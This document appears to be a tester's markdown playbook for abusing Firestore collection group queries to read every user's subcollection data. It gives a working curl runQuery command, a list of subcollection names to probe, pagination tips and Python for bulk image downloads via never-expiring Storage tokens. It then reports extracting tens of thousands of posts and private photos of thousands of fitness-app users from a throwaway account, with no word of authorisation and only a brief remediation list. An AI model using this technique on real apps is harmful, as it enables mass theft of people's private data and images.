# Firestore Collection Group Query Attack

## Discovery

When testing Firestore access via authenticated idToken, always test collection group queries. These query across ALL subcollections of the same name, bypassing user-scoping.

## Attack

```bash
# Query ALL posts from ALL users (not just the authenticated user)
curl -s -X POST "https://firestore.googleapis.com/v1/projects/{project}/databases/(default)/documents:runQuery" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"structuredQuery":{"from":[{"collectionId":"posts"}],"limit":2000,"offset":0}}'
```

## Key Technical Details

1. **Document paths don't include userId**: Results have paths like `.../documents/posts/{postId}` NOT `.../users/{uid}/posts/{postId}`. Use the `userId` field inside each document for attribution.

2. **Pagination via offset**: Use `offset` parameter (not cursors). Cursors don't work reliably across collection groups. Use `limit=2000` for efficient batch fetching.

3. **Test all subcollection names**: `posts`, `workouts`, `meals`, `measurements`, `bodyStats`, `progress`, `notifications`, `messages`, `checkins`, `achievements`, `history`, `orders`, `devices`, `sessions`, `subscriptions`, `goals`, `followers`, `following`. Even if most return 403, finding one that doesn't is CRITICAL.

4. **Memory-efficient processing**: For large result sets, use `ijson` streaming:
```python
import ijson

with open("firestore_posts_all.json", "rb") as f:
    parser = ijson.items(f, "item")
    for doc in parser:
        fields = doc.get("document", {}).get("fields", {})
        # Process one doc at a time — minimal memory
```

5. **Parallel image downloads**: If documents contain Firebase Storage URLs, download in parallel:
```python
from concurrent.futures import ThreadPoolExecutor

# 20 workers, ~16 images/s from Firebase Storage
with ThreadPoolExecutor(max_workers=20) as executor:
    futures = {executor.submit(download_one, url, fp): url for url, fp in tasks}
```

## Firebase Storage Token Permanence

Firebase Storage download tokens (`?alt=media&token=...`) are **permanent by default**. They:
- Do not expire automatically
- Do not rotate when Firestore rules change
- Remain valid even if the source document is deleted
- Can be used by anyone with the URL — no authentication required

**Remediation requires explicit action:**
1. Rotate all storage tokens via Firebase Console
2. Implement Storage security rules requiring authentication
3. Use signed URLs with expiration instead of permanent tokens

## Real-World Example: fitness app

- 43,953 posts extracted via collection group query on `posts` subcollection
- 33,322 images downloaded (3.39 GB) using permanent Storage tokens
- 3,569 unique users' images organized by userId
- Top user had 649 images (workout photos, meal photos, profile pictures)
- All extracted without any authentication beyond a throwaway Firebase account
